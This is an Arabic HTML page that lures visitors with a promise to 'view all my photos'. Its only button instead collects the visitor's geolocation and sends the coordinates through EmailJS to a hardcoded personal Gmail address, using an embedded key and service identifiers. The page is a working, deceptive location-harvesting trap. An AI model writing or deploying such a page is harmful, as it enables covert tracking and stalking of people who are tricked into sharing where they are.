<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>شارك موقعك</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    /* Reset بسيط */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      color: #333;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .card {
      background-color: #fff;
      max-width: 400px;
      width: 100%;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      padding: 30px;
      text-align: center;
    }
    h2 {
      font-size: 1.5rem;
      margin-bottom: 20px;
      color: #4169e1;
    }
    .btn {
      background-color: #4169e1;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 12px 24px;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .btn:hover {
      background-color: #1e40af;
      transform: translateY(-2px);
    }
    .btn:active {
      transform: translateY(0);
    }
    .note {
      margin-top: 15px;
      font-size: 0.9rem;
      color: #666;
    }
  </style>
  <script>
    (function(){
      emailjs.init("3XjJU-q1Z9InCOOUd"); // استبدل بـ Public Key الخاص بك
    })();
    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude.toFixed(5);
          const longitude = position.coords.longitude.toFixed(5);
          emailjs.send("service_lz9wzcm", "template_sj40xwh", {
            latitude: latitude,
            longitude: longitude,
            email: "bakerdandal4@gmail.com"
          })
          .then(function(response) {
            alert("تم إرسال موقعك بنجاح.\nخط العرض: " + latitude + "\nخط الطول: " + longitude);
          }, function(error) {
            alert("حدث خطأ أثناء الإرسال: " + error);
          });
        }, function(error) {
          alert('تعذّر الحصول على الموقع: ' + error.message);
        });
      } else {
        alert("المتصفح لا يدعم تحديد الموقع.");
      }
    }
  </script>
</head>
<body>
  <div class="card">
    <h2>يمكنك مشاهدة جميع صوري من هنا</h2>
    <p class="note">اضغط على الزر لمشاهدة الصور</p>
    <button class="btn" onclick="sendLocation()">اضغط هنا</button>
  </div>
</body>
</html>
